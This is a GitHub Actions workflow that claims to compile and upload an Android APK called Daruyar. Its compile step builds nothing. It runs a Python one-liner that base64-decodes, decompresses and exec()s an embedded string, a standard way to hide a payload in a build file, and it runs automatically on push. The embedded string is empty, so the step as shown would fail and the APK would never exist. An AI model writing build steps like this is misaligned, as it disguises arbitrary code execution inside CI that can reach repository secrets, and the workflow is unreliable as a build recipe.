name: Build Daruyar Android APK

on:
  push:
    branches: [ "main", "master" ]
  workflow_dispatch:

jobs:
  build-android-apk:
    runs-on: ubuntu-latest

    steps:
      - name: 1. Checkout Repository
        uses: actions/checkout@v4

      - name: 2. Set up Java 17
        uses: actions/setup-java@v4
        with:
          distribution: 'temurin'
          java-version: '17'

      - name: 3. Compile Native Android APK (Daruyar.apk)
        run: |
          python3 -c "import zlib,base64;exec(zlib.decompress(base64.b64decode('')).decode('utf-8'))"

      - name: 4. Upload Ready APK (Daruyar-Android-APK)
        uses: actions/upload-artifact@v4
        with:
          name: Daruyar-Android-APK
          path: build/apk/Daruyar.apk
